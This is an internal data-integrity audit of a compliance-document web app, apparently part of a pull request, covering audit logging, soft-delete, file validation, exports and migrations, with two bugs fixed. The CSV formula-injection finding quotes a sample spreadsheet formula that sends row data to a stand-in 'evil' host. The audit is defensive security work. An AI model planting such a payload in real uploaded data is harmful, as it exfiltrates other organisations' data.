# Data-integrity & file-pipeline audit — 2026-06-22 (#246)

Adversarial audit of the persistence layer and the file pipeline end to end — the failures that quietly
**corrupt** rather than crash. Method (per epic #235): each class gets a written verdict — a disproof
(SAFE) citing the exact code path, or a finding → fix / ticket.

## Result: 2 confirmed bugs (both fixed in this PR with control tests); everything else SAFE / acceptable.

> **Review note (this PR's careful-review pass).** The 5-agent review confirmed every SAFE verdict and
> the audit-bloat fix, and caught a second bug this audit's first draft missed: **CSV formula injection**
> in the export (class 6) — `BuildCsvAsync` wrote user/vendor-controlled fields with CsvHelper's
> injection protection at its `None` default, so a `=`-leading uploaded filename (the PUBLIC portal
> stores it raw) executes as a formula in the org's spreadsheet. **Fixed here** (`InjectionOptions.Escape`
> + control test). The first draft reasoned only about the PDF renderer and missed the spreadsheet sink.

| # | Class | Verdict | Evidence / fix |
|---|---|---|---|
| 1 | Audit-log Before/After size bound on huge fields | **BUG → FIXED HERE** | the interceptor skips the `JsonDocument` `ExtractionFields` but **not its string sibling `ExtractionRawJson`** (raw OCR+LLM payload, ~20 KB), so it landed in Before AND After of every user-context `Document` mutation. Fixed: omit it (+ golden-snapshot control test) |
| 2 | Soft-delete: account email vs unique index | SAFE | account deletion scrubs `Email → deleted+{id}@deleted.invalid` (unique per id), freeing the original address for re-registration (ADR 0013) |
| 3 | Soft-delete: vendor delete cascade | SAFE / acceptable | links deactivated + vendor soft-deleted atomically (#269); documents survive as independent compliance artifacts with intact referential integrity (the soft-deleted vendor renders "—") — a product choice, not corruption |
| 4 | Audit completeness: `ExecuteUpdate`/`ExecuteDelete`/raw-SQL bypass | SAFE | every bypass site is background/system (sweep, cost, Resend status), a non-audited entity, or explicitly audited (`vendorPortalLink.deactivated_on_vendor_delete`); user-facing audited mutations go through tracked `SaveChanges` |
| 5 | File pipeline: validation, transcode, bad files | SAFE | magic-byte validation (8-byte floor rejects zero-byte), HEIC→JPEG transcode is bomb-guarded and fails to a 400 **before** any blob write (#220); corrupt/encrypted PDFs pass magic bytes then fail extraction visibly (terminal `Failed`) |
| 6 | Export integrity over hostile files | SAFE (no blob merge) **+ BUG → FIXED HERE** (CSV formula injection) | exports are **generated metadata reports** (never embed uploaded blobs → a hostile file can't corrupt them; truncation disclosed, cap 500, #197). But the CSV wrote user/vendor strings unescaped — `=`-leading filename = spreadsheet formula injection across the vendor→customer boundary. Fixed: `InjectionOptions.Escape` + control test |
| 7 | Migrations: drift guard + destructive migrations | SAFE / scoped | startup auto-migrate + drift guard (ADR 0016, #227) catches "assembly migrations not applied" (the #226 outage) and fail-fasts; snapshot↔schema sync pinned by `DatabaseMigratorIntegrationTests`. Manual-drift / destructive-migration detection is out of scope by design (accepted) |
| 8 | Verdict input consistency (single-writer) | SAFE | `UpdateFields` writes `ExtractionFields` + typed columns + JSON mirror in ONE `SaveChanges`, then re-evaluates — a single writer's persisted result is internally consistent (the manual-edit-vs-extraction RACE is the concurrency audit's, filed as #337) |

The bad-file corpus recipes in `docs/qa/test-fixtures.md` informed the file-pipeline reasoning; the
interceptor + soft-delete are the #41-designated DO-NOT-TOUCH area, so the one fix here lands with the
control-asserting test + AuditLog Before/After golden snapshot #246/#41 prescribe.

---

## 1. Audit-log Before/After size bound  ⟶  FIXED

`AuditSaveChangesInterceptor.SerializeSnapshot` excludes secrets (`PasswordHash → "***"`) and skips
bulky/opaque values by TYPE (`value is byte[] || value is JsonDocument`). That type skip catches
`Document.ExtractionFields` (a `JsonDocument`) — but `Document.ExtractionRawJson` is a **`string`** (the
raw OCR + LLM payload the worker writes, OCR text up to ~20 KB), so it sailed past the type check and was
serialized into BOTH `BeforeJson` and `AfterJson` of every user-context `Document` mutation (PATCH, field
edit, verify, re-extract). The audit log is durable AND user-exportable, so this is unbounded growth (a
doc edited N times accrues ~2·N·payload of audit JSON) and pushes the raw extraction blob into a table it
was clearly meant to stay out of — the very large-payload exclusion the `JsonDocument` skip exists for.

**Fixed here**: a `SkippedLargePayloadProperties` set omits `ExtractionRawJson` from the snapshot entirely
(omitted, not `"***"`-redacted — it is bulk, not a secret), mirroring the `JsonDocument` skip's intent.
Per the #246/#41 DO-NOT-TOUCH rule, the change ships with a control test:
`DocumentEndpointsTests.Document_update_audit_omits_the_raw_extraction_payload_but_keeps_the_meaningful_fields`
seeds a doc with a sentinel-bearing `ExtractionRawJson` + `ExtractionFields`, PATCHes it, and asserts the
audit Before/After (a) contains neither the sentinel nor the `ExtractionRawJson`/`ExtractionFields` keys
AND (b) still contains the meaningful small columns (`OriginalFileName`, `ComplianceStatus`) — proving the
skip didn't gut the audit diff. The existing `Change_password_does_not_write_the_password_hash_into_the_audit_log`
continues to pin the `PasswordHash` redaction (unchanged).

## 2. Soft-delete — account email vs the unique index

`User.Email` carries a (non-partial) unique index, so a soft-deleted account that kept its email would
block the person from ever re-registering with it. `DeleteAccount` (ADR 0013) prevents that: it scrubs
`Email = "deleted+{user.Id:N}@deleted.invalid"` (unique per id) and `FullName = "Deleted account"` in the
same UPDATE as the soft-delete, freeing the original address. Pinned by `AccountManagementTests`. SAFE.

## 3. Soft-delete — vendor delete cascade

`DeleteVendor` (#269) deactivates the vendor's portal links (`ExecuteUpdate`, to avoid arming EF's
client cascade into a HARD delete of the link rows) and soft-deletes the vendor, in one transaction. It
deliberately does **not** cascade to the vendor's documents: a document survives with its `VendorId` FK
intact pointing at the (still-present, soft-deleted) vendor row — referential integrity holds, and the
query filter (`Vendor.DeletedAt == null`) renders the now-hidden vendor as "—" on the list/export. This
is a product choice (compliance documents outlive a removed vendor), not data corruption: no dangling FK,
no torn row, and the document stays manageable (reassign or delete). Dashboard/plan counts continue to
include the surviving documents, which is consistent with "the files still exist". SAFE / acceptable.

## 4. Audit completeness — interceptor-bypass sites

`ExecuteUpdate`/`ExecuteDelete`/raw-SQL bypass the `SaveChanges` interceptor, so each site was checked for
a silently-unaudited *user-facing* mutation of an audited entity:
- **Background / system (no current user → no audit by design):** `ComplianceSweepBackgroundService`
  (date-driven status cache), `CostTrackingService.RecordSpendAsync` (spend counter),
  `ReminderEndpoints.ResendWebhook` (delivery-status update). Auditing these high-frequency system writes
  would be noise; the meaningful events are recorded elsewhere.
- **Explicitly audited:** `VendorPortalEndpoints` and `VendorEndpoints.DeleteVendor` write an explicit
  `vendorPortalLink.deactivated…` `IAuditLogger` row precisely because `ExecuteUpdate` skips the
  interceptor (the code comments call this out); the parent vendor soft-delete is interceptor-audited.
  `ComplianceEndpoints.DeleteTemplate` follows the identical pattern: its `ExecuteUpdate` clears
  `Vendor.ComplianceTemplateId` across the affected vendors and writes an explicit
  `vendor.template_cleared_on_template_delete` row, so that bypass also keeps its trail.
- **Sub-entity cascade:** `SampleEndpoints` link deactivation rides the audited sample clear; `DeleteRule`'s
  `DELETE … RETURNING` is scoped through the filtered parent template (tenant-safe per #242).
No user-facing audited-entity mutation loses its trail. `AuditLog` rows are org-stamped (the interceptor
refuses to write when `OrganizationId` is null/empty) and never serialize `byte[]`/`JsonDocument`/redacted
secrets. SAFE.

## 5. File pipeline — validation, transcode, bad inputs

`FileValidationService` enforces a 10 MB cap, an 8-byte floor (rejects zero-byte and too-tiny), a seekable
stream, and magic-byte detection (PDF/JPEG/PNG/HEIC/HEIF — never `Content-Type`), reading via `ReadAtLeast`
so a short read can't false-reject. HEIC/HEIF normalization (`MagickImageTranscoder`, #220/ADR 0018) is
decompression-bomb-guarded (header-only dimension check + 50 MP / 50 k-axis ceilings + process-wide
`ResourceLimits`), pins the HEIC coder (no delegate steering), strips EXIF/GPS, and on any decode failure
returns `null` → the endpoint answers 400 **before** any blob upload — so a mid-transcode failure leaves
no blob and no row. Only the transcoded JPEG is stored (the original HEIC is never persisted → no dual-blob
retention). A truncated / corrupt / password-protected / encrypted PDF passes the `%PDF` magic gate, gets
stored, and then fails extraction into a terminal, user-visible `Failed`/`ManualRequired` — never silent
corruption. Note: a transcoded JPEG can modestly exceed the 10 MB *input* cap (HEIC compresses better), but
it is bounded by the 50 MP pixel guard (realistically ≤ ~15 MB) and the 10 MB cap is an input/DoS bound,
not a storage contract — acceptable. SAFE.

## 6. Export integrity over hostile files

The ticket's worried-about failure mode — "QuestPDF merge over N documents including a hostile one silently
drops pages" — is **structurally absent**: `ExportService.BuildAuditReportAsync`/`BuildCsvAsync`/`BuildVendorReportAsync`
build a *report of metadata* (filename, vendor, type, expiry, derived compliance) from DB rows. They never
call `blobs.DownloadAsync` and never embed the uploaded file bytes, so a corrupt / password-protected /
enormous / hostile uploaded file cannot fail or corrupt an export. User-controlled strings (filenames,
vendor names) render as literal PDF text (QuestPDF, not markup) → no injection. Each export is a single
point-in-time DB read with a deterministic `OrderBy`; the audit slice is capped at 500 with the cap
**disclosed** in the caption (`Showing the 500 most recent…`, #197) rather than silently truncated, and
fetches `cap + 1` to detect truncation. The verdict is date-overlaid at generation time (#257) so an export
never certifies a stale-Compliant expired doc. SAFE on the hostile-file-merge axis.

**CSV formula injection (FIXED HERE — review finding).** The structural "no blob merge" safety above does
NOT cover the *content* of the metadata cells. `BuildCsvAsync` wrote `OriginalFileName`, `Vendor.Name`, and
`UploadedBy` verbatim, and CsvHelper defaults `InjectionOptions` to `None` — so a value beginning `=`, `+`,
`-`, `@`, TAB, or CR was written raw. The strongest vector is the **PUBLIC vendor portal**: it stores the
uploaded `OriginalFileName` raw (`SanitizeFileName` is applied only to the blob name, not the stored display
name), so an untrusted vendor uploads a file named e.g. `=HYPERLINK("http://evil?"&A2,"open")` and, when the
org owner exports `/api/export/csv` and opens it in Excel/Sheets, the formula executes / exfiltrates the row
— a stored injection across the vendor→customer trust boundary. The first audit draft reasoned only about the
QuestPDF text sink (literal, safe) and missed the spreadsheet sink. **Fixed** by setting
`InjectionOptions.Escape` on the `CsvConfiguration` (prefixes the injection-escape character so the cell
renders as literal text), pinned by `ExportEndpointsTests.Csv_export_neutralizes_spreadsheet_formula_injection_in_the_filename`.
(PDF/email sinks were already safe: QuestPDF renders literal text; reminder emails `HtmlEncode`. Boundary
hardening of the stored `OriginalFileName` itself is left to cleanup epic #41 — the CSV escape closes the
live sink.)

**Perf observation (not a regression; → #41).** `BuildAuditReportAsync`/`BuildCsvAsync` load the FULL
`Document` entity (incl. the ~20 KB `ExtractionRawJson` + the `ExtractionFields` jsonb) for every org doc to
render ~6 scalar columns — ~20 MB+ into memory per export at 1000+ docs/org. It predates this branch and
exports are manual/infrequent, so per the epic's "production changes only as confirmed-bug fixes" rule it is
left to the simplification epic #41 (project to the needed scalars, as `ListVendors`/`GetVendor` already do).

## 7. Migrations — drift guard & destructive migrations

Covered structurally by the #243 concurrency audit (EF `MigrateAsync` advisory lock under overlapping
deploys, fail-fast on a bad migration). For data integrity: the drift guard (`DatabaseMigrator`, ADR 0016,
#227) refuses to start when the assembly carries migrations the DB lacks — the #226 "9 migrations behind"
outage signature. Its scope is exactly that direction; it does NOT (and is not meant to) detect a
hand-edited prod schema that diverged without a migration, nor block an intrinsically destructive migration
(a column drop applies like any DDL) — those are code-review / operational concerns, accepted by design.
Snapshot↔schema sync is pinned by `DatabaseMigratorIntegrationTests` (every migration applies cleanly to a
fresh container, and an unchanged schema is a no-op). SAFE / scoped.

## 8. Verdict input consistency (single-writer)

`DocumentEndpoints.UpdateFields` mirrors each edit into the canonical compliance inputs — the
`ExtractionFields` JSON, the typed `GeneralLiabilityLimit`/`EffectiveDate`/`ExpirationDate` columns — and
persists them in a SINGLE `SaveChangesAsync`, then re-evaluates (ADR 0017, #216). So a single writer's
persisted state is never half-old/half-new: the inputs commit atomically and the verdict is recomputed
from them. The cross-writer RACE (a manual edit interleaving an in-flight re-extraction) is a separate
concern and is filed as **[#337](https://github.com/neboxdev/complidrop/issues/337)** by the #243
concurrency audit; HERE the single-writer persisted result is internally consistent. SAFE.

## Tests

Both fixes ship with control tests:
- class 1 (audit bloat): `DocumentEndpointsTests.Document_update_audit_omits_the_raw_extraction_payload_but_keeps_the_meaningful_fields`
  — asserts the raw payload is absent from Before/After, the meaningful columns survive, AND the combined
  audit JSON stays under a size bound (a regression net for any future large string column).
- class 6 (CSV injection): `ExportEndpointsTests.Csv_export_neutralizes_spreadsheet_formula_injection_in_the_filename`
  — a `=`-leading filename survives in the CSV but never starts a cell as a raw formula (would fail under
  the prior `InjectionOptions=None` default).

The other verdicts rest on existing coverage, confirmed present: `AccountManagementTests` (email scrub +
PasswordHash redaction + GDPR export), `VendorEndpointsTests` (delete cascade + portal-link deactivation
audit), `FileValidationServiceTests` + `ImageTranscoderTests` (bad-file corpus, bomb guard),
`ExportEndpointsTests` (truncation disclosure, audit-window math), `DatabaseMigratorIntegrationTests`
(drift guard + apply-all), and `ComplianceVerdictFreshnessTests` (date-overlay export at generation time).
